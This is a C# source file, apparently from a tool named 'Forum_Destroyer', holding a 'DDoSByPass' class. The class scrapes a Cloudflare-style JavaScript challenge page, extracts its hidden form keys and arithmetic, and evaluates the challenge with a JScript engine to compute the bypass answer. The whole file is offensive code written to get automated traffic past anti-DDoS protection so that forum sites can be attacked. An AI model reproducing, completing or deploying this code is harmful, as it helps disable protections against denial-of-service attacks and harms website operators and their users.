using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using System.Windows.Forms;
using System.IO;

namespace Forum_Destroyer
{
    class DDoSByPass
    {
        public bool ProcessResponse(ref WebClient client, string response)
        {
            
            int where = response.IndexOf("{\"");
            if (where == -1)
            {
                return false;
            }
            where = response.IndexOf(':', where) + 1;
            int finish = response.IndexOf('}', where);
            string Key1 = response.Substring(where, finish - where);

            where = response.IndexOf("action=", where);
            if (where == -1)
            {
                return false;
            }
            where += 8;
            finish = response.IndexOf('"', where);
            string PostUrl = response.Substring(where, finish - where);

            where = response.IndexOf("name=", where);
            if (where == -1)
            {
                return false;
            }
            where += 16;
            finish = response.IndexOf('"', where);
            string rKey = response.Substring(where, finish - where);

            where = response.IndexOf("name=", where);
            if (where == -1)
            {
                return false;
            }
            where += 23;
            finish = response.IndexOf('"', where);
            string jschl_vcKey = response.Substring(where, finish - where);

            where = response.IndexOf("name=", where);
            if (where == -1)
            {
                return false;
            }
            where += 19;
            finish = response.IndexOf('"', where);
            string passKey = response.Substring(where, finish - where);

            where = response.IndexOf("visibility", where);
            if (where == -1)
            {
                return false;
            }

            where = response.IndexOf('>', where);
            where++;
            finish = response.IndexOf('<', where);
            string StrangeKey = response.Substring(where, finish - where);


            where = response.IndexOf("-form');");
            if (where == -1)
            {
                return false;
            }
            where += 8;
            where = response.IndexOf(';', where);
            where++;
            finish = response.IndexOf("a.value", where);
            finish++;
            string Calculations = response.Substring(where, finish - where), TrueCalculations = "";
            where = Calculations.IndexOf('=');
            while(where != -1)
            {
                char operation = Calculations[where - 1];
                where++;
                finish = Calculations.IndexOf(';', where);
                while(Calculations[finish + 1] == ' ')
                {
                    finish = Calculations.IndexOf(';', finish + 1);
                }

                string Calculation = Calculations.Substring(where, finish - where);
                if (Calculation.StartsWith("function"))
                {
                    Calculation = "Key2";
                }
                else if (Calculation.Contains("function"))
                {
                    int twhere = Calculation.IndexOf("eval"), tfinish = Calculation.IndexOf("}", twhere);
                    Calculation = Calculation.Remove(twhere, tfinish - twhere);
                    Calculation = Calculation.Insert(twhere, "98"); // replace with the first charcode of the target website, for instance "b" is 98
                }
                TrueCalculations += "Handler.HanderKey" + operation + "=" + Calculation + "; " + Environment.NewLine;

                where = Calculations.IndexOf('=', finish);
            }

            ScriptEngine engine = new ScriptEngine("jscript");
            string ParseContent = File.ReadAllText("execute.js");
            ParseContent = ParseContent.Replace("DefaltValue", Key1);
            ParseContent = ParseContent.Replace("StrangeKey", StrangeKey);
            ParseContent = ParseContent.Replace("CalCulations", TrueCalculations);
            engine.Parse(ParseContent);

            string jschl_answer = engine.Eval("GetResult()").ToString();
            MessageBox.Show(jschl_answer);
            return true;
        }
    }
}
